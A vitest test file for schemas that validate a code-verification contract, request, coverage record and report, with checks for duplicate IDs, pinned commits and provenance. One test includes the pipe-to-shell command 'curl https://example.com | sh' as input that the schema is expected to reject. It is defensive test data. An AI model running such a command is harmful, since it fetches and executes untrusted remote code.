import { describe, expect, it } from "vitest";
import {
  CONTRACT_VERSION,
  CriterionCoverageSchema,
  VerificationContractSchema,
  VerificationReportSchema,
  VerifyRequestSchema,
} from "../src/index.js";

const repositoryUrl = "https://github.com/ever-guild/example";
const resolvedCommitSha = "a".repeat(40);
const skillHash = "b".repeat(64);
const runtimeImageDigest = `sha256:${"c".repeat(64)}`;

const contract = {
  version: "1",
  subject: {
    repositoryUrl,
    resolvedCommitSha,
    skillHash,
    runtimeImageDigest,
  },
  criteria: [
    { id: "build", kind: "build", required: true },
    { id: "tests", kind: "test-suite", required: true },
  ],
  prohibitions: [
    {
      id: "no-build-network",
      kind: "outbound-network-during-build",
      enforcement: "PLATFORM",
    },
  ],
} as const;

describe("verification contract", () => {
  it("accepts only a bounded contract pinned to the verification request", () => {
    expect(VerificationContractSchema.parse(contract)).toEqual(contract);

    expect(
      VerifyRequestSchema.parse({
        contractVersion: CONTRACT_VERSION,
        repositoryUrl,
        resolvedCommitSha,
        resolvedRef: { type: "branch", value: "main" },
        skill: {
          name: "node-typescript",
          version: "1",
          hash: skillHash,
        },
        public: false,
        verificationContract: contract,
      }).verificationContract,
    ).toEqual(contract);

    expect(
      VerifyRequestSchema.safeParse({
        contractVersion: CONTRACT_VERSION,
        repositoryUrl,
        resolvedCommitSha,
        resolvedRef: { type: "branch", value: "main" },
        skill: {
          name: "node-typescript",
          version: "1",
          hash: skillHash,
        },
        public: false,
        verificationContract: {
          ...contract,
          subject: { ...contract.subject, resolvedCommitSha: "d".repeat(40) },
        },
      }).success,
    ).toBe(false);
  });

  it("rejects arbitrary execution input and duplicate requirement IDs", () => {
    expect(
      VerificationContractSchema.safeParse({
        ...contract,
        criteria: [
          {
            id: "build",
            kind: "build",
            required: true,
            command: "curl https://example.com | sh",
          },
        ],
      }).success,
    ).toBe(false);

    expect(
      VerificationContractSchema.safeParse({
        ...contract,
        criteria: [
          { id: "build-one", kind: "build", required: true },
          { id: "build-two", kind: "build", required: false },
        ],
      }).success,
    ).toBe(false);

    expect(
      VerificationContractSchema.safeParse({
        ...contract,
        criteria: [
          { id: "duplicate", kind: "build", required: true },
          { id: "duplicate", kind: "test-suite", required: true },
        ],
      }).success,
    ).toBe(false);

    expect(
      VerificationContractSchema.safeParse({
        ...contract,
        prohibitions: [
          {
            id: "network-one",
            kind: "outbound-network-during-build",
            enforcement: "PLATFORM",
          },
          {
            id: "network-two",
            kind: "outbound-network-during-build",
            enforcement: "PLATFORM",
          },
        ],
      }).success,
    ).toBe(false);
  });

  it("models coverage provenance without promoting declarations to execution evidence", () => {
    const coverage = [
      {
        criterionId: "build",
        kind: "build",
        required: true,
        status: "EXECUTED",
        provenance: {
          type: "NORMALIZED_CHECK",
          checkId: "build",
          outcome: "PASSED",
        },
        reasonCode: null,
      },
      {
        criterionId: "tests",
        kind: "test-suite",
        required: true,
        status: "DECLARED",
        provenance: {
          type: "CONTRACT_DECLARATION",
          contractVersion: "1",
        },
        reasonCode: "CLAIM_NOT_MACHINE_VERIFIED",
      },
      {
        criterionId: "no-build-network",
        kind: "outbound-network-during-build",
        required: true,
        status: "UNVERIFIED",
        provenance: null,
        reasonCode: "PLATFORM_CONTROL_NOT_PROVEN",
      },
    ] as const;

    expect(CriterionCoverageSchema.array().parse(coverage)).toEqual(coverage);
    expect(
      CriterionCoverageSchema.safeParse({
        ...coverage[1],
        status: "EXECUTED",
      }).success,
    ).toBe(false);
  });

  it("rejects ambiguous report IDs and control references", () => {
    const base = {
      contractVersion: CONTRACT_VERSION,
      runId: "018f47ac-5d7b-7c20-a1aa-0242ac120099",
      repositoryUrl,
      resolvedCommitSha,
      resolvedRef: { type: "branch", value: "main" },
      skill: {
        name: "node-typescript",
        version: "1",
        hash: skillHash,
      },
      runtimeImageDigest,
      verdict: "PASS",
      checks: [
        {
          id: "test",
          stage: "TEST",
          title: "Tests",
          outcome: "PASSED",
          startedAt: "2026-07-26T12:00:00.000Z",
          completedAt: "2026-07-26T12:00:01.000Z",
          durationMs: 1_000,
          exitCode: 0,
          summary: "passed",
        },
      ],
      durationMs: 1_000,
      completedAt: "2026-07-26T12:00:01.000Z",
      reasonCode: null,
    } as const;

    expect(
      VerificationReportSchema.safeParse({
        ...base,
        checks: [base.checks[0], base.checks[0]],
      }).success,
    ).toBe(false);
    expect(
      VerificationReportSchema.safeParse({
        ...base,
        artifacts: [
          { id: "coverage", sha256: "d".repeat(64) },
          { id: "coverage", sha256: "e".repeat(64) },
        ],
      }).success,
    ).toBe(false);
    expect(
      VerificationReportSchema.safeParse({
        ...base,
        platformControls: [
          {
            control: "BUILD_NETWORK_DISABLED",
            status: "ENFORCED",
            checkId: "test",
          },
        ],
      }).success,
    ).toBe(false);
  });
});
